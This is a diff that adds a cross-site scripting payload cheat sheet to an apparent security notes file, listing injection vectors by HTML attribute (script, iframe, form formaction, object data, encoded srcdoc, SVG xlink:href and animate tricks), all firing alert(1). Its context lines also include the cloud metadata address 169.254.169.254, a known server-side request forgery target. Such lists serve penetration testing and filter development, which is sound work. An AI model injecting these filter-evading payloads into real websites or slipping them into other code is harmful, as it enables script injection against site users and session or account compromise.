@@ -104,3 +104,53 @@ http://169.254.169.254/latest/meta-data/
 https://gist.github.com/soaj1664/9588791
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+1) (no attribute)
+
+    <script>alert(1)</script>
+
+2) src
+
+    <script src=javascript:alert(1)>
+    <iframe src=javascript:alert(1)>
+    <embed src=javascript:alert(1)> 
+
+3) href
+
+    <a href=javascript:alert(1)>click
+    <math><brute href=javascript:alert(1)>click 
+
+4) action
+
+    <form action=javascript:alert(1)><input type=submit>
+    <isindex action=javascript:alert(1) type=submit value=click> 
+
+5) formaction
+
+    <form><button formaction=javascript:alert(1)>click
+    <form><input formaction=javascript:alert(1) type=submit value=click>
+    <form><input formaction=javascript:alert(1) type=image value=click>
+    <form><input formaction=javascript:alert(1) type=image src=http://brutelogic.com.br/webgun/img/youtube1.jpg>
+    <isindex formaction=javascript:alert(1) type=submit value=click> 
+
+6) data
+
+    <object data=javascript:alert(1)> 
+
+7) srcdoc
+
+    <iframe srcdoc=%26lt;svg/o%26%23x6Eload%26equals;alert%26lpar;1)%26gt;>
+
+8) xlink:href
+
+    <svg><script xlink:href=data:,alert(1)></script>
+    <svg><script xlink:href=data:,alert(1) /> 
+    <math><brute xlink:href=javascript:alert(1)>click 
+
+9) from
+
+    <svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=%26>
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
